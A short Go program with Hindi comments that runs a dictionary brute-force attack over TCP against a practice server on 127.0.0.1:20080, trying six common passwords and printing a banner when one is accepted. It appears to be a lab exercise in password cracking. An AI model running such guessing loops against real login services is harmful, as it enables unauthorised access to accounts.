package main

import (
	"bufio"
	"fmt"
	"net"
	"strings"
	"time"
)

func main() {
	// यह हमारी छोटी सी rockyou.txt (पासवर्ड की डिक्शनरी) है
	passwords := []string{"admin", "123456", "qwerty", "password", "hacker123", "root"}

	fmt.Println("[*] Starting Brute-Force Attack on 127.0.0.1:20080...")

	for _, pwd := range passwords {
		fmt.Println("Trying password:", pwd)

		// 1. सर्वर से जुड़ें
		conn, err := net.Dial("tcp", "127.0.0.1:20080")
		if err != nil {
			fmt.Println("Server is down!")
			return
		}

		// 2. सर्वर का "Enter Password: " वाला मैसेज पढ़ें (ताकि सिंक सही रहे)
		bufio.NewReader(conn).ReadString(' ')

		// 3. अपना पासवर्ड सर्वर को भेजें
		fmt.Fprintf(conn, pwd+"\n")

		// 4. सर्वर का जवाब पढ़ें
		response, _ := bufio.NewReader(conn).ReadString('\n')
		response = strings.TrimSpace(response)

		// 5. चेक करें कि अटैक सफल हुआ या नहीं
		if response == "Access Granted! Welcome Boss." {
			fmt.Println("\n[+] BOOM! Password cracked successfully: --->", pwd, "<---")
			conn.Close()
			break // पासवर्ड मिल गया, तो अटैक रोक दो
		} else {
			fmt.Println("[-] Failed")
		}

		conn.Close()
		// थोड़ा इंतज़ार करें ताकि सर्वर क्रैश न हो जाए (0.5 seconds)
		time.Sleep(500 * time.Millisecond)
	}
}

